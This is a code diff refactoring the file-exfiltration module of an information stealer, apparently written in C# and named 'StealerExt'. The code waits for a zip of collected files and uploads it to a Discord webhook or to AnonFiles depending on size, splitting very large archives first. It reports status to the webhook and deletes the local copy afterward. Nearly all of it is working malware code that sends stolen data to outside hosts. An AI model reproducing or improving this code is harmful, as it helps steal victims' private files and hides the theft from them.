@@ -7,23 +7,22 @@ using System.Threading;
 
 namespace StealerExt
 {
-    public class FileStealer
+    internal class FileStealer
     {   
         public static void GetFiles()
         {
-            #region Send Message
-            new API(API.wHook)
-            {
-                _name = API.name,
-                _ppUrl = API.pfp
-            }.idk("Waiting for file to be found and archived so it can be sent. If file is large then it can take a while!", null);
-            #endregion
-            #region Wait & Send Files
+            new API(API.wHook).idk("Waiting for file to be found and archived so it can be sent. If file is large then it can take a while!", null);
             string upload = API.Temp + "files.zip";
-            string _Files = string.Empty;
+            string _FilesErr;
             while (!File.Exists(upload)) {}
             long size = new FileInfo(upload).Length;
-            if (size < 19000000000)
+            // Upload to cdn.discord.com via webhook.
+            if (size < 7900000) 
+            {
+                new API(API.wHook).idk("File found! Sending...", upload);
+            } 
+            // Upload to AnonFiles.com
+            else if (size < 19500000000)
             {
                 try
                 {
@@ -36,39 +35,24 @@ namespace StealerExt
                         string ResponseBody = Encoding.ASCII.GetString(Response);
                         if (ResponseBody.Contains("\"error\": {"))
                         {
-                            _Files += "Error: " + ResponseBody.Split('"')[7] + "\r\n";
+                            _FilesErr = "Error: " + ResponseBody.Split('"')[7] + "\r\n";
                         }
                         else
                         {
-                            _Files += "Files: " + ResponseBody.Split('"')[15] + "\r\n";
+                            _FilesErr = "Files: " + ResponseBody.Split('"')[15] + "\r\n";
                         }
                     }
                 }
-                catch (WebException ex)
+                catch (Exception ex)
                 {
-                    _Files += "Ex: " + ex.Message + "\r\n";
+                    _FilesErr = "Ex: " + ex.Message + "\r\n";
                 }
+                new API(API.wHook).idk(_FilesErr, null);
                 File.Delete(upload);
-                try
-                {
-                    new API(API.wHook)
-                    {
-                        _name = API.name,
-                        _ppUrl = API.pfp
-                    }.idk(_Files, null);
-                }
-                catch (Exception x)
-                {
-                    new API(API.wHook)
-                    {
-                        _name = API.name,
-                        _ppUrl = API.pfp
-                    }.idk(x.Message, null);
-                }
             }
+            // Split the zip file.
             else
             {
-                DirectoryInfo di = new DirectoryInfo(API.Temp + "files");
                 ZipFile zip = ZipFile.Read(upload);
                 zip.ExtractAll(API.Temp + "files", ExtractExistingFileAction.OverwriteSilently);
                 using (ZipFile z = new ZipFile())
@@ -91,38 +75,22 @@ namespace StealerExt
                             string ResponseBody = Encoding.ASCII.GetString(Response);
                             if (ResponseBody.Contains("\"error\": {"))
                             {
-                                _Files += "Error: " + ResponseBody.Split('"')[7];
+                                _FilesErr = "Error: " + ResponseBody.Split('"')[7];
                             }
                             else
                             {
-                                _Files += "Files: " + ResponseBody.Split('"')[15];
+                                _FilesErr = "Files: " + ResponseBody.Split('"')[15];
                             }
                         }
                     }
                     catch (WebException ex)
                     {
-                        _Files += "Ex: " + ex.Message;
+                        _FilesErr = "Ex: " + ex.Message;
                     }
+                    new API(API.wHook).idk(_FilesErr, null);
                     File.Delete(file);
                 }
-                try
-                {
-                    new API(API.wHook)
-                    {
-                        _name = API.name,
-                        _ppUrl = API.pfp
-                    }.idk(_Files, null);
-                }
-                catch (Exception x)
-                {
-                    new API(API.wHook)
-                    {
-                        _name = API.name,
-                        _ppUrl = API.pfp
-                    }.idk(x.Message, null);
-                }
             }
-            #endregion
         }
     }
 }
